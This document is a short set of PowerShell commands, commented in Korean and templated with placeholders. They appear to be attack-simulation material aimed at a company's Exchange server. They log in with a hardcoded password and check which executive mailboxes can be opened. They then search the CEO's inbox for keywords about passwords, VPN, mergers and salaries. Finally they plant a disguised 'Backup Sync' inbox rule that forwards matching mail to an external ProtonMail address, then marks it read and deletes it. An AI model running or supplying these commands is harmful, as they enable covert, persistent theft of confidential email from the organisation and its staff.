powershell -ep bypass -c "
# Exchange Web Services 접속 및 메일함 열거
$cred = New-Object System.Net.NetworkCredential('{userName}@{companyName}.com', 'P@ssw0rd!');
$ews = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService('Exchange2019');
$ews.Credentials = $cred;
$ews.AutodiscoverUrl('{userName}@{companyName}.com');

# 접근 가능한 메일함 목록 확인
$mailboxes = @('CEO','CFO','HR-Manager','IT-Admin','{userName}');
foreach($mb in $mailboxes) {
  try { $ews.GetFolderInfo($mb+'@{companyName}.com', 'Inbox'); Write-Host \"[OK] $mb - Inbox accessible\" }
  catch { Write-Host \"[DENIED] $mb - No access\" }
}"

powershell -ep bypass -c "
# CEO 메일함에서 민감 키워드 검색
$keywords = @('비밀번호','VPN','인증서','계약서','인수합병','급여','해고');
$totalResults = 0;
foreach($kw in $keywords) {
  $filter = \"subject:$kw OR body:$kw\";
  $results = $ews.FindItems('CEO@{companyName}.com', 'Inbox', $filter, 50);
  Write-Host \"[$kw] $($results.TotalCount)건 발견\";
  $totalResults += $results.TotalCount;
}
Write-Host \"\n총 $totalResults건의 민감 이메일 발견\""

powershell -ep bypass -c "
# 메일 전달 규칙 설정 - 지속적 이메일 탈취
$rule = New-InboxRule -Mailbox CEO@{companyName}.com -Name 'Backup Sync' -SubjectContainsWords @('계약','인수','합병','급여') -ForwardTo 'ext-backup@proton.me' -MarkAsRead -DeleteMessage;
Write-Host 'Inbox rule created:';
Get-InboxRule -Mailbox CEO@{companyName}.com -Identity 'Backup Sync' | Format-List Name, SubjectContainsWords, ForwardTo, DeleteMessage"
